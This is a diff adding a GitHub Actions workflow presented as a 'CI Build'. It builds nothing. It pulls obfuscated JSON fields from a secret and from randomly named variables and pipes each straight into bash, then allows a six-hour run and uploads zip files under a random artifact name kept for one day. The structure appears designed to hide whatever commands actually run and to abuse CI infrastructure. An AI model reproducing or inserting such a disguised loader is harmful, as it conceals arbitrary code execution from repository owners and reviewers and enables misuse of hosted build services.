@@ -1,0 +1,32 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  task:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Execute
+        env:
+          jk7: ${{ secrets.jk7 }}
+        run: |
+          printf '%s' "$jk7" | jq -r .c4290 | /bin/bash
+          printf '%s' "$dyf50" | jq -r .hsu00 | /bin/bash
+          echo $wcs21 | jq -r .u2844 | /bin/bash
+          printf '%s' "$dwsuh9953" | jq -r .rh44 | /bin/bash
+          printf '%s' "$n06906" | jq -r .ahjbp90899 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VyQ0vZWL
+          path: "*.zip"
+          retention-days: 1
